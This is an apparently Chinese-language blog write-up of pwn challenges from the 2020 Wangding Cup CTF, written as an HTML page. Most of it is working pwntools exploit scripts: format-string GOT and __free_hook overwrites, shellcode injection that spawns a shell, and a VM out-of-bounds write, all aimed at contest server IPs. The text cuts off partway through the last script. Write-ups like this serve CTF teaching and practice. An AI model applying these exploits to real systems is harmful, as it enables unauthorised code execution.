@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+  
+    <meta name="description" content="个人记录和分享学习经历的一个小博客">
+  
+
+  
+
+  
+    <meta name="author" content="Whali3n51">
+  
+
+  
+
+  
+
+  <title>2020网鼎杯-Pwn部分wp | Whali3n51&#39;s blog</title>
+
+  
+
+  
+    <link rel="icon" href="/logo.jpg">
+  
+
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+    <link href="https://cdn.bootcss.com/highlight.js/9.15.6/styles/github.min.css" rel="stylesheet">
+  
+
+  <link rel="stylesheet" href="/css/style.css">
+<link rel="alternate" href="/atom.xml" title="Whali3n51's blog" type="application/atom+xml">
+</head>
+<body>
+  <div id="container">
+    <!-- header -->
+<header class="header">
+  <div class="header-navbar">
+    <div class="header-navbar-left">
+      <h1 class="header-navbar-logo">
+        <a href="/">
+          
+            <img src="/css/images/logo.png" alt="Whali3n51&#39;s blog" />
+          
+        </a>
+      </h1>
+    </div>
+    <div class="header-navbar-right">
+      <div class="header-navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="header-navbar-list">
+        
+          <li class="header-navbar-item"><a href="/">主页</a></li>
+        
+          <li class="header-navbar-item"><a href="/about">关于</a></li>
+        
+          <li class="header-navbar-item"><a href="/links">友链</a></li>
+        
+          <li class="header-navbar-item"><a href="/tags">标签</a></li>
+        
+          <li class="header-navbar-item"><a href="/categories">分类</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <section id="main"><!-- 文章详情页 -->
+
+
+<!-- banner container -->
+<div class="banner-container">
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    
+      <div class="banner-content full-content">
+        <div class="post-image" style="background-image: url(/css/images/grass.jpg)"></div>
+        <div class="post-text">
+          <div class="type-wrap">
+            <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
+          </div>
+          <h1 class="title-wrap">2020网鼎杯-Pwn部分wp</h1>
+          <h2 class="title-sub-wrap">
+            <strong>Whali3n51</strong>
+            <span>发布于</span>
+            
+  <a href="javascript:;" target="_blank" rel="noopener" class="article-date">
+    <time datetime="2020-05-21T04:00:00.000Z" itemprop="datePublished">2020-05-21</time>
+  </a>
+
+          </h2>
+        </div>
+      </div>
+    
+  
+
+  
+  
+
+</div>
+
+<!-- 文章内容 -->
+
+<div class="body-container">
+  <article id="article-container" class="main-container article-container">
+    <div class="article-content">
+      
+      
+
+      <div class="article-entry">
+        <p>总的来说，我个人对这四场比赛的评价就是简单的太简单，难得太难，直接难成cve。我裂开</p>
+<h2 id="青龙组"><a href="#青龙组" class="headerlink" title="青龙组"></a>青龙组</h2><h3 id="boom1"><a href="#boom1" class="headerlink" title="boom1:"></a>boom1:</h3><p>这个就直接是个C的编译器。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'boom1'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		p=rs()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		ctx.remote = (<span class="string">'182.92.73.10'</span>,<span class="number">24573</span>)</span><br><span class="line">		p=rs(<span class="string">'remote'</span>)</span><br><span class="line">	<span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">char *a;</span></span><br><span class="line"><span class="string">char *b;</span></span><br><span class="line"><span class="string">char *buf;</span></span><br><span class="line"><span class="string">int main()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">a = "whali3n51";</span></span><br><span class="line"><span class="string">b = a - (0x7F8FE6E5C028 - 0x7F8FE6933000);</span></span><br><span class="line"><span class="string">a = b + 0x5f0f48- 0xf08 + 8;</span></span><br><span class="line"><span class="string">a[0] = 0;</span></span><br><span class="line"><span class="string">a = b + 0x5f0f48;</span></span><br><span class="line"><span class="string">buf = 0xCD0F3 + b;</span></span><br><span class="line"><span class="string">a[0] = (buf)&amp;0xFF;</span></span><br><span class="line"><span class="string">a[1] = (buf&gt;&gt;8)&amp;0xFF;</span></span><br><span class="line"><span class="string">a[2] = (buf&gt;&gt;16)&amp;0xFF;</span></span><br><span class="line"><span class="string">printf("%p %p %p",b,buf,*(int *)a);</span></span><br><span class="line"><span class="string">&#125;'''</span></span><br><span class="line">payload = payload.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
+
+<h3 id="boom2"><a href="#boom2" class="headerlink" title="boom2:"></a>boom2:</h3><p>这个是一个简单的VM,数组能越界，然后拿到栈上的数据，通过加减法，让指针指向libc_start_main,然后在计算一下将调整一下值，让libc_start_main变成onegadget的值，然后写到libc_start_main的地方。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'boom2'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		p=rs()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		ctx.remote = (<span class="string">'182.92.73.10'</span>,<span class="number">36642</span>)</span><br><span class="line">		p=rs(<span class="string">'remote'</span>)</span><br><span class="line">	<span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">	libc_base = ctx.bases.libc</span><br><span class="line">	<span class="keyword">print</span> hex(libc_base)</span><br><span class="line">	ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0x920</span>,<span class="string">'sym2'</span>:<span class="number">0xA3E</span>&#125;</span><br><span class="line">	ctx.breakpoints = [<span class="number">0x920</span>,<span class="number">0xA3E</span>]</span><br><span class="line">	ctx.debug()</span><br><span class="line">payload=p64(<span class="number">1</span>)+p64(<span class="number">0xffffffffffffff18</span>)+p64(<span class="number">13</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xfffffffffffffffc</span>)+p64(<span class="number">9</span>)+p64(<span class="number">25</span>)+p64(<span class="number">13</span>)+p64(<span class="number">9</span>)+p64(<span class="number">13</span>)+p64(<span class="number">1</span>)+p64(<span class="number">854295</span>)+p64(<span class="number">25</span>)+p64(<span class="number">11</span>)</span><br><span class="line">choice()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sa(<span class="string">"code&gt;"</span>,payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
+
+<h3 id="faster0"><a href="#faster0" class="headerlink" title="faster0:"></a>faster0:</h3><p>这个kirin给了思路，但是我tcl,不会使用angr来爆破。无果，以后有时间学学angr吧，感觉用来盲打挺不错的。</p>
+<h2 id="白虎组"><a href="#白虎组" class="headerlink" title="白虎组"></a>白虎组</h2><p>这一场很无语，一个cve,一个隐写附件，让人误导为没有附件，我无语，记录一下其他pwn吧。</p>
+<h3 id="pwn2："><a href="#pwn2：" class="headerlink" title="pwn2："></a>pwn2：</h3><p>很简单的思路，直接格式化字符串修改got表为调用system的地方</p>
+<p>还有一种思路利用可以用%*X$d%Y$n来把栈中X处的值赋给栈中偏移Y处的指针指向的地址。利用这种方式，可以用来满足条件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'pwn2'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		p=rs()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		ctx.remote = (<span class="string">'123.57.225.26'</span>,<span class="number">15246</span>)</span><br><span class="line">		p=rs(<span class="string">'remote'</span>)</span><br><span class="line">	<span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span>(local==<span class="number">1</span>):</span><br><span class="line">		libc_base = ctx.bases.libc</span><br><span class="line">		<span class="keyword">print</span> hex(libc_base)</span><br><span class="line">		ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0x804876A</span>&#125;</span><br><span class="line">		ctx.breakpoints = [<span class="number">0x804876A</span>]</span><br><span class="line">		ctx.debug()</span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">"FirstName:"</span>,p32(<span class="number">0x804A028</span>))</span><br><span class="line">sa(<span class="string">"LastName:"</span>,<span class="string">"%35291c%20$hn"</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="pwn3："><a href="#pwn3：" class="headerlink" title="pwn3："></a>pwn3：</h3><p>sosososo easy的一题，他啥保护都没有开，直接eip劫持了,调用read，写入shellcode，然后控制eip，指向shellcode即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'pwn3'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catflag</span><span class="params">(i)</span>:</span></span><br><span class="line">	sl(<span class="string">'ls'</span>)</span><br><span class="line">	<span class="comment">#ru("bin")</span></span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	r()</span><br><span class="line">	sl(<span class="string">"cat /flag*"</span>)</span><br><span class="line">	flag=r()</span><br><span class="line">	f.write(<span class="string">"172.17.135."</span>+ip[i]+<span class="string">'	'</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		p=rs()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		ctx.remote = (<span class="string">'123.57.225.26'</span>,<span class="number">42435</span>)</span><br><span class="line">		p=rs(<span class="string">'remote'</span>)</span><br><span class="line">	<span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span>(local==<span class="number">1</span>):</span><br><span class="line">		libc_base = ctx.bases.libc</span><br><span class="line">		<span class="keyword">print</span> hex(libc_base)</span><br><span class="line">		ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0xEDA</span> , <span class="string">'sym2'</span>:<span class="number">0x10AF</span>&#125;</span><br><span class="line">		ctx.breakpoints = [<span class="number">0xEDA</span>,<span class="number">0x10AF</span>]</span><br><span class="line">		ctx.debug()</span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload=<span class="string">"1"</span>*<span class="number">0x78</span>+p64(<span class="number">0x00000000004006a3</span>)+p64(<span class="number">0x601500</span>)+p64(<span class="number">0x4004D0</span>)+p64(<span class="number">0x601500</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">sl(asm(shellcraft.sh()))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="朱雀组"><a href="#朱雀组" class="headerlink" title="朱雀组"></a>朱雀组</h2><h3 id="format"><a href="#format" class="headerlink" title="format:"></a>format:</h3><p>看似很复杂，其实很简单的格式化字符串利用，改写__free_hook,直接getshell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'format'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		p=rs()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		ctx.remote = (<span class="string">'59.110.243.101'</span>, <span class="number">25413</span>)</span><br><span class="line">		p=rs(<span class="string">'remote'</span>)</span><br><span class="line">	<span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span>(local==<span class="number">1</span>):</span><br><span class="line">		libc_base = ctx.bases.libc</span><br><span class="line">		<span class="keyword">print</span> hex(libc_base)</span><br><span class="line">		ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0x0FB5</span>&#125;</span><br><span class="line">		ctx.breakpoints = [<span class="number">0x0FB5</span>]</span><br><span class="line">		ctx.debug()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">	sla(<span class="string">"&gt;"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">"size: "</span>,size)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span 